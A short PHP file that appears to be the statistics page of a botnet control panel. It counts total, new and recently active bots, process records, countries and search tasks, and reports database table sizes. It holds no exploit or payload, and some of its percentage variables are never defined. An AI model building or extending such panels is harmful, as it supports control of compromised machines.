<?php

get_function('size_format');

$bots = array();
$db_stat = array();

$bots['all'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots');
$bots['new'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE  (min_post=\'0\') AND (max_post=\'0\')');
$bots['active'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE  (min_post!=\'0\') AND (max_post!=\'0\')');

$bots['allnp'] = @number_format(($bots['new'] / $bots['all']) * 100, 2);
$bots['allap'] = @number_format(($bots['active'] / $bots['all']) * 100, 2);

$bots['a24'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE (last_date >= UNIX_TIMESTAMP(DATE_ADD(CURRENT_TIMESTAMP(), INTERVAL -24 HOUR)))');
$bots['a7'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE (last_date >= UNIX_TIMESTAMP(DATE_ADD(CURRENT_TIMESTAMP(), INTERVAL -7 DAY)))');
$bots['a1'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_bots WHERE (last_date >= UNIX_TIMESTAMP(DATE_ADD(CURRENT_TIMESTAMP(), INTERVAL -1 MONTH)))');

$bots['n24p'] = @number_format(($bots['n24'] / $bots['all']) * 100, 2);
$bots['n7p'] = @number_format(($bots['n7'] / $bots['all']) * 100, 2);
$bots['n1p'] = @number_format(($bots['n1'] / $bots['all']) * 100, 2);
$bots['a24p'] = @number_format(($bots['a24'] / $bots['all']) * 100, 2);
$bots['a7p'] = @number_format(($bots['a7'] / $bots['all']) * 100, 2);
$bots['a1p'] = @number_format(($bots['a1'] / $bots['all']) * 100, 2);

$bots['proc_all'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_process_stats');
$bots['country'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_country');
$bots['search_task'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_search_task');
$bots['search_result'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_search_result');

$db_stats = $mysqli->query("SHOW TABLE STATUS");

foreach($db_stats as $value){	$value->all_size = $value->Avg_row_length + $value->Data_length + $value->Index_length + $value->Data_free;
	$value->percent = number_format(($value->all_size / $value->Max_data_length) * 100, 2);
	$db_stat[$value->Name] = $value;
}
unset($db_stats);

$smarty->assign('db_stat', $db_stat);
$smarty->assign('bots', $bots);

?>